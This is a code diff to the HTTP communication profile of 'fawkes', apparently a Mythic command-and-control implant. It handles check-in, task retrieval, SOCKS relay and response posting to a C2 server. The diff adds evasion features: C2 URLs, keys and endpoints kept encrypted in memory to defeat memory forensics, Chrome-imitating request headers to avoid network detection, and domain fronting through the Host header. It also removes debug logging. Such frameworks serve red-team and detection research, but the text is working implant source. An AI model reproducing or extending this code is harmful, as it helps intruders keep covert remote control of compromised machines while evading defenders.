@@ -21,8 +21,33 @@ import (
 	"strings"
 	"time"
 
+	"github.com/andybalholm/brotli"
+
 	"fawkes/pkg/structs"
 )
+
+// configVault holds AES-256-GCM encrypted C2 configuration. Sensitive fields
+// (C2 URL, encryption key, user agent, endpoints) are stored encrypted and
+// only decrypted into local variables for the duration of each HTTP operation.
+// This reduces the plaintext exposure window from "entire process lifetime"
+// to "single HTTP request duration" (~milliseconds).
+type configVault struct {
+	key  []byte // AES-256-GCM key (random, generated at SealConfig)
+	blob []byte // Encrypted JSON of sensitiveConfig
+}
+
+// sensitiveConfig holds the C2 configuration fields that should not persist
+// as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
+type sensitiveConfig struct {
+	BaseURL       string            `json:"b"`
+	UserAgent     string            `json:"a"`
+	EncryptionKey string            `json:"k"`
+	CallbackUUID  string            `json:"c"`
+	HostHeader    string            `json:"h"`
+	GetEndpoint   string            `json:"g"`
+	PostEndpoint  string            `json:"p"`
+	CustomHeaders map[string]string `json:"x,omitempty"`
+}
 
 // HTTPProfile handles HTTP communication with Mythic
 type HTTPProfile struct {
@@ -39,6 +64,11 @@ type HTTPProfile struct {
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
+
+	// Config vault — encrypted storage for sensitive C2 fields.
+	// When active, the struct fields above are zeroed and all access
+	// goes through getConfig() which decrypts on demand.
+	vault *configVault
 
 	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
 	// GetDelegatesOnly returns only pending delegate messages (no edges). Used by GetTasking.
@@ -94,6 +124,115 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 	return profile
 }
 
+// SealConfig encrypts all sensitive C2 configuration fields into an AES-256-GCM
+// vault and zeros the plaintext struct fields. After sealing, fields are only
+// decrypted on-demand for the duration of each HTTP operation. This reduces the
+// memory forensics exposure window from the entire process lifetime to individual
+// HTTP request durations (~milliseconds).
+func (h *HTTPProfile) SealConfig() error {
+	key := make([]byte, 32)
+	if _, err := rand.Read(key); err != nil {
+		return fmt.Errorf("config vault key generation failed: %w", err)
+	}
+
+	cfg := &sensitiveConfig{
+		BaseURL:       h.BaseURL,
+		UserAgent:     h.UserAgent,
+		EncryptionKey: h.EncryptionKey,
+		CallbackUUID:  h.CallbackUUID,
+		HostHeader:    h.HostHeader,
+		GetEndpoint:   h.GetEndpoint,
+		PostEndpoint:  h.PostEndpoint,
+		CustomHeaders: h.CustomHeaders,
+	}
+
+	plaintext, err := json.Marshal(cfg)
+	if err != nil {
+		vaultZeroBytes(key)
+		return fmt.Errorf("config vault marshal failed: %w", err)
+	}
+
+	blob := vaultEncrypt(key, plaintext)
+	vaultZeroBytes(plaintext)
+	if blob == nil {
+		vaultZeroBytes(key)
+		return fmt.Errorf("config vault encryption failed")
+	}
+
+	h.vault = &configVault{key: key, blob: blob}
+
+	// Zero plaintext struct fields — all access now goes through the vault
+	h.BaseURL = ""
+	h.UserAgent = ""
+	h.EncryptionKey = ""
+	h.CallbackUUID = ""
+	h.HostHeader = ""
+	h.GetEndpoint = ""
+	h.PostEndpoint = ""
+	h.CustomHeaders = nil
+
+	return nil
+}
+
+// getConfig returns the current C2 configuration. If the vault is active,
+// decrypts and returns the config from the vault. Otherwise returns the
+// plaintext struct fields directly. Each call creates an independent copy —
+// safe for concurrent use from multiple goroutines.
+func (h *HTTPProfile) getConfig() *sensitiveConfig {
+	if h.vault == nil {
+		return &sensitiveConfig{
+			BaseURL:       h.BaseURL,
+			UserAgent:     h.UserAgent,
+			EncryptionKey: h.EncryptionKey,
+			CallbackUUID:  h.CallbackUUID,
+			HostHeader:    h.HostHeader,
+			GetEndpoint:   h.GetEndpoint,
+			PostEndpoint:  h.PostEndpoint,
+			CustomHeaders: h.CustomHeaders,
+		}
+	}
+
+	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
+	if plaintext == nil {
+		return nil
+	}
+
+	var cfg sensitiveConfig
+	if err := json.Unmarshal(plaintext, &cfg); err != nil {
+		vaultZeroBytes(plaintext)
+		return nil
+	}
+	vaultZeroBytes(plaintext)
+	return &cfg
+}
+
+// IsSealed returns true if the config vault is active (fields are encrypted).
+func (h *HTTPProfile) IsSealed() bool {
+	return h.vault != nil
+}
+
+// UpdateCallbackUUID updates the callback UUID in the vault (or struct field
+// if vault is not active). Called after Checkin to store the server-assigned UUID.
+func (h *HTTPProfile) UpdateCallbackUUID(uuid string) {
+	if h.vault != nil {
+		cfg := h.getConfig()
+		if cfg != nil {
+			cfg.CallbackUUID = uuid
+			plaintext, err := json.Marshal(cfg)
+			if err == nil {
+				newBlob := vaultEncrypt(h.vault.key, plaintext)
+				vaultZeroBytes(plaintext)
+				if newBlob != nil {
+					vaultZeroBytes(h.vault.blob)
+					h.vault.blob = newBlob
+				}
+			}
+		}
+		return
+	}
+	h.CallbackUUID = uuid
+}
+
 // buildTLSConfig creates a TLS configuration based on the verification mode.
 // Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
 func buildTLSConfig(tlsVerify string) *tls.Config {
@@ -135,6 +274,11 @@ func buildTLSConfig(tlsVerify string) *tls.Config {
 
 // Checkin performs the initial checkin with Mythic
 func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
+	cfg := h.getConfig()
+	if cfg == nil {
+		return fmt.Errorf("failed to decrypt C2 configuration")
+	}
+
 	checkinMsg := structs.CheckinMessage{
 		Action:       "checkin",
 		PayloadUUID:  agent.PayloadUUID,
@@ -156,8 +300,8 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	}
 
 	// Encrypt if encryption key is provided
-	if h.EncryptionKey != "" {
-		body, err = h.encryptMessage(body)
+	if cfg.EncryptionKey != "" {
+		body, err = h.encryptMessage(body, cfg.EncryptionKey)
 		if err != nil {
 			return fmt.Errorf("encryption failed: %w", err)
 		}
@@ -168,7 +312,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	// Send checkin request to configured endpoint
-	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
 	if err != nil {
 		return fmt.Errorf("checkin request failed: %w", err)
 	}
@@ -186,18 +330,16 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 	// Decrypt the checkin response if needed
 	var decryptedResponse []byte
-	if h.EncryptionKey != "" {
+	if cfg.EncryptionKey != "" {
 		// Base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
-			// log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
 			return fmt.Errorf("failed to decode checkin response: %w", err)
 		}
 
 		// Decrypt the response
-		decryptedResponse, err = h.decryptResponse(decodedData)
+		decryptedResponse, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
 		if err != nil {
-			// log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
 			return fmt.Errorf("failed to decrypt checkin response: %w", err)
 		}
 	} else {
@@ -207,25 +349,23 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	// Parse the response to extract callback UUID
 	var checkinResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
-		// log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
-		// log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
 		return fmt.Errorf("failed to parse checkin response: %w", err)
 	}
 
 	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
-			h.CallbackUUID = callbackStr
-			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+			h.UpdateCallbackUUID(callbackStr)
+			log.Printf("[INFO] Received callback UUID: %s", callbackStr)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
-			h.CallbackUUID = callbackStr
-			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+			h.UpdateCallbackUUID(callbackStr)
+			log.Printf("[INFO] Received callback UUID: %s", callbackStr)
 		}
 	} else {
 		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
-		h.CallbackUUID = agent.PayloadUUID
+		h.UpdateCallbackUUID(agent.PayloadUUID)
 	}
 
 	return nil
@@ -233,12 +373,17 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 // GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
 func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
+	cfg := h.getConfig()
+	if cfg == nil {
+		return nil, nil, fmt.Errorf("failed to decrypt C2 configuration")
+	}
+
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
 		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
 		Socks:       outboundSocks,
 		// Include agent identification for checkin updates
-		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
+		PayloadUUID: h.getActiveUUID(agent, cfg), // Use callback UUID if available
 		PayloadType: "fawkes",
 		C2Profile:   "http",
 	}
@@ -265,44 +410,36 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	}
 
 	// Encrypt if encryption key is provided
-	if h.EncryptionKey != "" {
-		body, err = h.encryptMessage(body)
+	if cfg.EncryptionKey != "" {
+		body, err = h.encryptMessage(body, cfg.EncryptionKey)
 		if err != nil {
 			return nil, nil, fmt.Errorf("encryption failed: %w", err)
 		}
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
-	activeUUID := h.getActiveUUID(agent)
+	activeUUID := h.getActiveUUID(agent, cfg)
 	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
 	if err != nil {
-		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
 		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	// log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
-
 	if resp.StatusCode != http.StatusOK {
-		// log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
 		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
 	}
 
 	respBody, err := readResponseBody(resp)
 	if err != nil {
-		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
 		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
-	// log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
-	// log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
-
 	// Decrypt the response if encryption key is provided
 	var decryptedData []byte
-	if h.EncryptionKey != "" {
+	if cfg.EncryptionKey != "" {
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
@@ -310,7 +447,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		}
 
 		// Decrypt the decoded data
-		decryptedData, err = h.decryptResponse(decodedData)
+		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
 		if err != nil {
 			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
 		}
@@ -321,20 +458,12 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		decryptedData = respBody
 	}
 
-	// log.Printf("[DEBUG] Attempting to parse response as JSON")
-
 	// Parse the decrypted response - Mythic returns different formats
 	var taskResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
 		// If not JSON, might be no tasks
-		// log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
 		return []structs.Task{}, nil, nil
 	}
-
-	// log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
-	// for key, _ := range taskResponse {
-	//	// log.Printf("[DEBUG] Response contains key: %s", key)
-	// }
 
 	// Extract tasks from response
 	var tasks []structs.Task
@@ -390,14 +519,15 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	return tasks, inboundSocks, nil
 }
 
-// decryptResponse decrypts a response from Mythic using the same format as Freyja
-func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
-	if h.EncryptionKey == "" {
+// decryptResponse decrypts a response from Mythic using the same format as Freyja.
+// The encKey parameter is the base64-encoded AES key from the C2 profile.
+func (h *HTTPProfile) decryptResponse(encryptedData []byte, encKey string) ([]byte, error) {
+	if encKey == "" {
 		return encryptedData, nil // No encryption
 	}
 
 	// Decode the base64 key
-	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
+	key, err := base64.StdEncoding.DecodeString(encKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
@@ -416,23 +546,13 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	// Extract ciphertext (everything between IV and HMAC)
 	ciphertext := encryptedData[52 : len(encryptedData)-32]
 
-	// log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
-
 	// Verify HMAC
 	mac := hmac.New(sha256.New, key)
 	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
 	mac.Write(dataForHmac)
 	expectedHmac := mac.Sum(nil)
 
-	if h.Debug {
-		// log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
-	}
-
 	if !hmac.Equal(hmacBytes, expectedHmac) {
-		if h.Debug {
-			// log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
-		}
-
 		// Try HMAC on IV + ciphertext (alternative method for Mythic)
 		mac3 := hmac.New(sha256.New, key)
 		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
@@ -440,9 +560,6 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 
 		if !hmac.Equal(hmacBytes, expectedHmac3) {
 			return nil, fmt.Errorf("HMAC verification failed with all methods")
-		}
-		if h.Debug {
-			// log.Printf("[DEBUG] Alternative HMAC method succeeded")
 		}
 	}
 
@@ -476,22 +593,35 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 }
 
 // GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
+// Reads from the vault if config is sealed.
 func (h *HTTPProfile) GetCallbackUUID() string {
+	if h.vault != nil {
+		if cfg := h.getConfig(); cfg != nil {
+			return cfg.CallbackUUID
+		}
+	}
 	return h.CallbackUUID
 }
 
-// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
-func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
+// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
+// Reads from the provided config to avoid accessing zeroed struct fields.
+func (h *HTTPProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
+	if cfg != nil && cfg.CallbackUUID != "" {
+		return cfg.CallbackUUID
+	}
 	if h.CallbackUUID != "" {
-		// log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
 		return h.CallbackUUID
 	}
-	// log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
 	return agent.PayloadUUID
 }
 
 // PostResponse sends a response back to Mythic, optionally including pending SOCKS data
 func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
+	cfg := h.getConfig()
+	if cfg == nil {
+		return nil, fmt.Errorf("failed to decrypt C2 configuration")
+	}
+
 	responseMsg := structs.PostResponseMessage{
 		Action:    "post_response",
 		Responses: []structs.Response{response},
@@ -523,8 +653,8 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	}
 
 	// Encrypt if encryption key is provided
-	if h.EncryptionKey != "" {
-		body, err = h.encryptMessage(body)
+	if cfg.EncryptionKey != "" {
+		body, err = h.encryptMessage(body, cfg.EncryptionKey)
 		if err != nil {
 			return nil, fmt.Errorf("encryption failed: %w", err)
 		}
@@ -532,11 +662,11 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
 	// Must use callback UUID (not payload UUID) after checkin
-	activeUUID := h.getActiveUUID(agent)
+	activeUUID := h.getActiveUUID(agent, cfg)
 	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
 	if err != nil {
 		return nil, fmt.Errorf("post response request failed: %w", err)
 	}
@@ -554,7 +684,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	// Decrypt the response if encryption key is provided (same as GetTasking)
 	var decryptedData []byte
-	if h.EncryptionKey != "" {
+	if cfg.EncryptionKey != "" {
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
@@ -562,7 +692,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		}
 
 		// Decrypt the decoded data
-		decryptedData, err = h.decryptResponse(decodedData)
+		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
 		if err != nil {
 			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
 		}
@@ -605,23 +735,35 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	return decryptedData, nil
 }
 
-// makeRequest is a helper function to make HTTP requests
-func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
-	// Ensure proper URL construction with forward slash
-	var url string
-	if strings.HasSuffix(h.BaseURL, "/") && strings.HasPrefix(path, "/") {
-		// Both have slash, remove one
-		url = h.BaseURL + path[1:]
-	} else if !strings.HasSuffix(h.BaseURL, "/") && !strings.HasPrefix(path, "/") {
-		// Neither has slash, add one
-		url = h.BaseURL + "/" + path
+// makeRequest is a helper function to make HTTP requests.
+// The cfg parameter provides sensitive fields (BaseURL, UserAgent, etc.)
+// from the decrypted vault rather than reading from zeroed struct fields.
+func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensitiveConfig) (*http.Response, error) {
+	// Resolve sensitive fields from config (vault) or struct (unsealed fallback)
+	baseURL := h.BaseURL
+	userAgent := h.UserAgent
+	hostHeader := h.HostHeader
+	var customHeaders map[string]string
+	if cfg != nil {
+		baseURL = cfg.BaseURL
+		userAgent = cfg.UserAgent
+		hostHeader = cfg.HostHeader
+		customHeaders = cfg.CustomHeaders
 	} else {
-		// One has slash, just concatenate
-		url = h.BaseURL + path
+		customHeaders = h.CustomHeaders
 	}
 
-	if h.Debug {
-		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
+	// Ensure proper URL construction with forward slash
+	var reqURL string
+	if strings.HasSuffix(baseURL, "/") && strings.HasPrefix(path, "/") {
+		// Both have slash, remove one
+		reqURL = baseURL + path[1:]
+	} else if !strings.HasSuffix(baseURL, "/") && !strings.HasPrefix(path, "/") {
+		// Neither has slash, add one
+		reqURL = baseURL + "/" + path
+	} else {
+		// One has slash, just concatenate
+		reqURL = baseURL + path
 	}
 
 	var reqBody io.Reader
@@ -629,35 +771,45 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		reqBody = bytes.NewReader(body)
 	}
 
-	req, err := http.NewRequest(method, url, reqBody)
+	req, err := http.NewRequest(method, reqURL, reqBody)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
 	// Set browser-realistic default headers to blend with legitimate traffic.
-	// These match common browser behavior and avoid network-level IOCs
-	// (e.g., bare Content-Type: text/plain or missing Accept-Language).
+	// These match Chrome's header set and avoid network-level IOCs.
 	// All defaults are overridable via CustomHeaders from the C2 profile.
-	req.Header.Set("User-Agent", h.UserAgent)
+	//
+	// Note on header ordering: Go's net/http sends headers in sorted (alphabetical)
+	// order, which differs from Chrome's native ordering. A custom Transport would
+	// be needed to control order for JA4H-level fingerprint matching.
+	req.Header.Set("User-Agent", userAgent)
 	if body != nil {
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	}
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept", chromeAcceptHeader)
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Encoding", chromeAcceptEncoding)
+
+	// sec-ch-ua client hint headers — Chrome has sent these on every request
+	// since v89. Missing them is a strong non-browser signal.
+	if secChUa := generateSecChUa(userAgent); secChUa != "" {
+		req.Header.Set("Sec-Ch-Ua", secChUa)
+		req.Header.Set("Sec-Ch-Ua-Mobile", generateSecChUaMobile(userAgent))
+		req.Header.Set("Sec-Ch-Ua-Platform", generateSecChUaPlatform(userAgent))
+	}
+
+	// Upgrade-Insecure-Requests: standard on every navigation request from Chrome
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
 
 	// Apply custom headers from C2 profile — these override any defaults above
-	for k, v := range h.CustomHeaders {
+	for k, v := range customHeaders {
 		req.Header.Set(k, v)
 	}
 
 	// Override Host header for domain fronting
-	if h.HostHeader != "" {
-		req.Host = h.HostHeader
-	}
-
-	if h.Debug {
-		// log.Printf("[DEBUG] Making %s request to %s", method, url)
+	if hostHeader != "" {
+		req.Host = hostHeader
 	}
 
 	resp, err := h.client.Do(req)
@@ -675,17 +827,21 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 // readResponseBody reads and decompresses the response body if needed.
 // When Accept-Encoding is set explicitly (for OPSEC-realistic headers), Go's
 // http.Transport does NOT auto-decompress responses. This helper transparently
-// handles gzip-compressed responses from CDNs, proxies, or load balancers.
+// handles gzip and Brotli-compressed responses from CDNs, proxies, or load balancers.
 func readResponseBody(resp *http.Response) ([]byte, error) {
-	if resp.Header.Get("Content-Encoding") == "gzip" {
+	switch resp.Header.Get("Content-Encoding") {
+	case "gzip":
 		gr, err := gzip.NewReader(resp.Body)
 		if err != nil {
 			return nil, fmt.Errorf("gzip decompression failed: %w", err)
 		}
 		defer gr.Close()
 		return io.ReadAll(gr)
+	case "br":
+		return io.ReadAll(brotli.NewReader(resp.Body))
+	default:
+		return io.ReadAll(resp.Body)
 	}
-	return io.ReadAll(resp.Body)
 }
 
 // getString safely gets a string value from a map
@@ -699,13 +855,14 @@ func getString(m map[string]interface{}, key string) string {
 }
 
 // encryptMessage encrypts a message exactly like Freyja's AesEncrypt.
+// The encKey parameter is the base64-encoded AES key from the C2 profile.
 // Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
-func (h *HTTPProfile) encryptMessage(msg []byte) ([]byte, error) {
-	if h.EncryptionKey == "" {
+func (h *HTTPProfile) encryptMessage(msg []byte, encKey string) ([]byte, error) {
+	if encKey == "" {
 		return msg, nil
 	}
 
-	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
+	key, err := base64.StdEncoding.DecodeString(encKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
@@ -750,4 +907,50 @@ func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
 	padding := blockSize - len(data)%blockSize
 	padText := bytes.Repeat([]byte{byte(padding)}, padding)
 	return append(data, padText...), nil
+}
+
+// vaultEncrypt encrypts plaintext with AES-256-GCM (nonce prepended).
+func vaultEncrypt(key, plaintext []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return nil
+	}
+	return gcm.Seal(nonce, nonce, plaintext, nil)
+}
+
+// vaultDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
+func vaultDecrypt(key, ciphertext []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize+1 {
+		return nil
+	}
+	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	plaintext, err := gcm.Open(nil, nonce, ct, nil)
+	if err != nil {
+		return nil
+	}
+	return plaintext
+}
+
+// vaultZeroBytes overwrites a byte slice with zeros.
+func vaultZeroBytes(b []byte) {
+	for i := range b {
+		b[i] = 0
+	}
 }
